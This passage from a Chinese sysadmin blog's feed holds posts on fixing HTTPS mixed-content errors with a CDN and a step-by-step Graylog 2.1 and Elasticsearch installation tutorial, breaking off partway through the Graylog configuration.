&lt;h2 id=&quot;参考：&quot;&gt;&lt;a href=&quot;#参考：&quot; class=&quot;headerlink&quot; title=&quot;参考：&quot;&gt;&lt;/a&gt;参考：&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/diafygi/acme-tiny&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub 安装教程 &lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;如何在Nginx申请安装配置免费HTTPS证书&quot;&gt;&lt;a href=&quot;#如何在Nginx申请安装配置免费HTTPS证书&quot; class=&quot;headerlink&quot; title=&quot;如何在Nginx申请安装配置免费HTTPS证书&quot;&gt;&lt;/a&gt;如何在Nginx申请安装配置免费H
    
    </summary>
    
      <category term="nginx" scheme="http://blog.yangcvo.me/categories/nginx/"/>
    
    
      <category term="Web Service" scheme="http://blog.yangcvo.me/tags/Web-Service/"/>
    
      <category term="Nginx" scheme="http://blog.yangcvo.me/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全</title>
    <link href="http://blog.yangcvo.me/2016/11/23/Web%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/%E7%94%B3%E8%AF%B7%E8%AF%81%E4%B9%A6Https/%E8%A7%A3%E5%86%B3Https%E8%AF%B7%E6%B1%82%E8%B7%A8%E5%9F%9FCDN%E8%B5%84%E6%BA%90http%E7%BD%91%E7%AB%99%E5%87%BA%E7%8E%B0%E8%AE%BF%E9%97%AE%E5%A4%B1%E8%B4%A5-%E8%AF%81%E4%B9%A6%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%AE%89%E5%85%A8/"/>
    <id>http://blog.yangcvo.me/2016/11/23/Web服务技术/申请证书Https/解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全/</id>
    <published>2016-11-23T09:25:23.000Z</published>
    <updated>2017-04-01T02:04:08.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全&quot;&gt;&lt;a href=&quot;#解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全&quot; class=&quot;headerlink&quot; title=&quot;解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全&quot;&gt;&lt;/a&gt;解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全&lt;/h1&gt;&lt;p&gt;这里讲如何解决跨域http资源请求证书出现问题， 上一篇我解决网站如何申请免费证书，实现申请免费证书在Nginx上面实现https访问。&lt;/p&gt;
&lt;p&gt;可是我一开始没有这么顺利实现我想要的效果，因为的确证书是有了访问可以https可是请求跨域http服务就出现问题了。&lt;br&gt;这里我是在又拍云做CDN加速的，所以这里说明下如果你的公司网站比如说：ihaozhuo.com&lt;br&gt;那么请求的时候&lt;a href=&quot;https://ihaozhuo.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://ihaozhuo.com&lt;/a&gt; 出现我下面同样的问题:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx5.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;这是我显示的错误图片当初截图留下记录成文档了。&quot;&gt;&lt;a href=&quot;#这是我显示的错误图片当初截图留下记录成文档了。&quot; class=&quot;headerlink&quot; title=&quot;这是我显示的错误图片当初截图留下记录成文档了。&quot;&gt;&lt;/a&gt;这是我显示的错误图片当初截图留下记录成文档了。&lt;/h4&gt;&lt;p&gt;这里我也做了HTTPS安全检测：&lt;a href=&quot;https://www.ssllabs.com/ssltest&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.ssllabs.com/ssltest&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx-ssl.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;如何解决：&quot;&gt;&lt;a href=&quot;#如何解决：&quot; class=&quot;headerlink&quot; title=&quot;如何解决：&quot;&gt;&lt;/a&gt;如何解决：&lt;/h3&gt;&lt;p&gt;这里我问前端的代码静态资源上面请求upyun的http去访问，这里我们在upyun对请求域名设置https方法：&lt;/p&gt;
&lt;p&gt;upyun对应的服务列表设置里面选择https设置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx7.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;配置好以后就可以生效了。&lt;/p&gt;
&lt;p&gt;这里需要把地址给到前端让他们在代码上面修改下HTTPS 更新下服务重启就出现访问正常了。&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全&quot;&gt;&lt;a href=&quot;#解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全&quot; class=&quot;headerlink&quot; title=&quot;解决Https请求跨域CDN资源http
    
    </summary>
    
      <category term="nginx" scheme="http://blog.yangcvo.me/categories/nginx/"/>
    
    
      <category term="Web Service" scheme="http://blog.yangcvo.me/tags/Web-Service/"/>
    
      <category term="Nginx" scheme="http://blog.yangcvo.me/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>graylog 升级2.1 集中日志解决方案</title>
    <link href="http://blog.yangcvo.me/2016/11/14/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%10%E5%B9%B3%E5%8F%B0/Graylog/graylog%20%E5%8D%87%E7%BA%A72.1%20%E9%9B%86%E4%B8%AD%E6%97%A5%E5%BF%97%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://blog.yangcvo.me/2016/11/14/日志分析平台/Graylog/graylog 升级2.1 集中日志解决方案/</id>
    <published>2016-11-14T09:56:03.000Z</published>
    <updated>2017-03-14T05:48:39.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;graylog-升级2-1-集中日志解决方案&quot;&gt;&lt;a href=&quot;#graylog-升级2-1-集中日志解决方案&quot; class=&quot;headerlink&quot; title=&quot;graylog 升级2.1 集中日志解决方案&quot;&gt;&lt;/a&gt;graylog 升级2.1 集中日志解决方案&lt;/h1&gt;&lt;p&gt;参考官网：&lt;a href=&quot;http://docs.graylog.org/en/2.1/pages/upgrade/graylog-2.1.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;升级到Graylog的2.1.x&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;一：为什么需要集中日志解决方案？&quot;&gt;&lt;a href=&quot;#一：为什么需要集中日志解决方案？&quot; class=&quot;headerlink&quot; title=&quot;一：为什么需要集中日志解决方案？&quot;&gt;&lt;/a&gt;一：为什么需要集中日志解决方案？&lt;/h3&gt;&lt;p&gt;在公司服务机子部署越来越多的情况下，让我们来想想会遇到的问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开发人员不能登录线上服务器查看详细日志，经过运维周转费时费力&lt;/li&gt;
&lt;li&gt;日志数据分散在多个系统，难以查找&lt;/li&gt;
&lt;li&gt;日志数据量大，查询速度慢&lt;/li&gt;
&lt;li&gt;一个调用会涉及多个系统，难以在这些系统的日志中快速定位数据&lt;/li&gt;
&lt;li&gt;数据不够实时&lt;/li&gt;
&lt;li&gt;很难对数据进行挖掘，分析，业务告警，审计&lt;/li&gt;
&lt;li&gt;这些问题的存在让开发以及运维人员很是头痛，严重影响效率！&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;二：什么是graylog技术栈？&quot;&gt;&lt;a href=&quot;#二：什么是graylog技术栈？&quot; class=&quot;headerlink&quot; title=&quot;二：什么是graylog技术栈？&quot;&gt;&lt;/a&gt;二：什么是graylog技术栈？&lt;/h3&gt;&lt;p&gt;为了解决上述问题，我们需要一个日志的集中管理方案，graylog技术栈：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;java （jdk1.8.0_66/）环境&lt;/li&gt;
&lt;li&gt;Collector-sidecar（收集日志）或者syslog&lt;/li&gt;
&lt;li&gt;Mongodb（存储日志源文件）&lt;/li&gt;
&lt;li&gt;Elasticsearch（提供搜索日志）&lt;/li&gt;
&lt;li&gt;Graylog2.1.1（搜索和视图展示日志，告警和权限）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有了这些，我们就能把日志先收集起来，进行我们想要的分析之后，web的形式展示出来，提供查询！&lt;/p&gt;
&lt;h3 id=&quot;三：graylog的安装部署&quot;&gt;&lt;a href=&quot;#三：graylog的安装部署&quot; class=&quot;headerlink&quot; title=&quot;三：graylog的安装部署&quot;&gt;&lt;/a&gt;三：graylog的安装部署&lt;/h3&gt;&lt;p&gt;安装环境：linux centOS系统安装，已安装JDK1.8版本，安装启动顺序&lt;/p&gt;
&lt;p&gt;1.安装部署mongodb&lt;br&gt;2.安装部署elasticsearch&lt;br&gt;3.安装部署graylog&lt;br&gt;4.安装部署Graylog Collector Sidecar&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt; &lt;strong&gt;1：安装部署mongodb&lt;/strong&gt; &lt;strong&gt;Java也安装&lt;/strong&gt;  参考我博文有介绍。 &lt;/p&gt;
&lt;p&gt; &lt;strong&gt;2：安装部署elasticsearch&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(1)下载jar包&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;wget https://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gz&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;如果报错&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;执行&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget --no-check-certificate&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;https://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gz&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(2)解压jar包&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;tar -zxvf elasticsearch-2.3.5.tar.gz -C /opt/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(3)修改elasticsearch.yml配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 这里需要修改配置文件：配置前先创建几个目录文件&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mkdir /home/data/es-data -p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mkdir /home/data/es-work -p&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearch-2.3.5安装目录conf下执行&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim elasticsearch-2.3.5/config/elasticsearch.yml&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cluster.name: graylog              &lt;span class=&quot;comment&quot;&gt;#集群名称建议命名graylog，便于识别区分&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: elasticsearch-node-1     &lt;span class=&quot;comment&quot;&gt;# elasticsearch集群节点名称&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;network.host: 192.168.1.234    &lt;span class=&quot;comment&quot;&gt;# 绑定节点IP&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http.port: 9200         &lt;span class=&quot;comment&quot;&gt;# 外部访问端口，默认，也可以安全考虑修改&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path.logs: /home/data/logs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path.data: /home/data/es-data&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.multicast.enabled: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;#多播发现方式关闭，因为graylog采用单播方式发现elasticsearch集群方式&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.unicast.hosts                   &lt;span class=&quot;comment&quot;&gt;#多个节点用逗号隔开&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.minimum_master_nodes: 3    &lt;span class=&quot;comment&quot;&gt;# elasticsearch集群节点，最少选举数，这个数一定要设置为整个集群节点个数的一半加1，即N/2+1，必须为奇数&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(4)启动elasticsearch服务&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;新建一个elasticsearch用户，出于安全考虑，elasticsearch服务不能使用root用户启动&lt;/p&gt;
&lt;p&gt;创建elasticsearch用户组及elasticsearch用户，执行&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;groupadd elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;useradd elasticsearch -g elasticsearch -p elasticsearch&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中-g使用户属于某个组，-p为新用户使用加密密码）&lt;br&gt;更改elasticsearch-2.3.5文件夹及内部文件的所属用户及组为elasticsearch:elasticsearch&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;chown -R elasticsearch:elasticsearch  /home/data/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chown -R elasticsearch:elasticsearch  elasticsearch-2.3.5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;切换用户&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;su elasticsearch&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在elasticsearch-2.3.5/bin目录下执行&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[elasticsearch@graylog bin]$ ps -ef | grep elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root     18265 16004  0 14:27 pts/1    00:00:00 su elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;502      18405     1 62 14:27 pts/1    00:00:13 /srv/jdk1.8.0_66/bin/java -Xms256m -Xmx1g -Djava.awt.headless=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -XX:+DisableExplicitGC -Dfile.encoding=UTF-8 -Djna.nosys=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; -Des.path.home=/opt/elasticsearch-2.3.5 -cp /opt/elasticsearch-2.3.5/lib/elasticsearch-2.3.5.jar:/opt/elasticsearch-2.3.5/lib/* org.elasticsearch.bootstrap.Elasticsearch start &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;502      18530 18266  0 14:27 pts/1    00:00:00 grep --color=auto ela&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(5)检查elasticsearch服务状态&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;执行如下命令测试Elasticsearch是否正常运行：&lt;/p&gt;
&lt;p&gt;$ curl -XGET ‘&lt;a href=&quot;http://localhost:9200/_cluster/health?pretty=true&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost:9200/_cluster/health?pretty=true&lt;/a&gt;‘&lt;/p&gt;
&lt;p&gt;输出的信息如下表示Elasticsearch安装成功：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[elasticsearch@graylog bin]$ curl -XGET &lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.234:9200/_cluster/health?pretty=true&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;graylog&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;status&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;yellow&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;timed_out&quot;&lt;/span&gt; : &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_nodes&quot;&lt;/span&gt; : 1,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_data_nodes&quot;&lt;/span&gt; : 1,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_primary_shards&quot;&lt;/span&gt; : 30,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_shards&quot;&lt;/span&gt; : 30,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;relocating_shards&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;initializing_shards&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;unassigned_shards&quot;&lt;/span&gt; : 30,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;delayed_unassigned_shards&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_pending_tasks&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_in_flight_fetch&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;task_max_waiting_in_queue_millis&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_shards_percent_as_number&quot;&lt;/span&gt; : 50.0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3：安装部署graylog-2-1版本&quot;&gt;&lt;a href=&quot;#3：安装部署graylog-2-1版本&quot; class=&quot;headerlink&quot; title=&quot;3：安装部署graylog-2.1版本&quot;&gt;&lt;/a&gt;3：安装部署graylog-2.1版本&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;(1)下载安装包&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;wget https://packages.graylog2.org/releases/graylog/graylog-2.1.1.tgz&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(2)解压安装包&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;tar -zxvf graylog-2.1.1.tgz -C /opt/.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(3)修改配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;修改安装目录下 graylog.conf.example 文件&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim graylog.conf.example&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;web_listen_uri 值是graylog启动成功后，web服务访问地址&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;web_listen_uri = http://192.168.1.234:9000/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;rest_listen_uri 的值，是graylog启动成功后，api访问地址&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;rest_listen_uri = http://192.168.1.234:9000/api/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;root_timezone = UTC  #设置时区，否则默认使用的是UTC时间也就是世界时间 这里是必须改下的，因为后期收集日志显示时间是有变化的。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;root_timezone = Asia/Shanghai&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中 password_secret 的值用命令生成&lt;/p&gt;
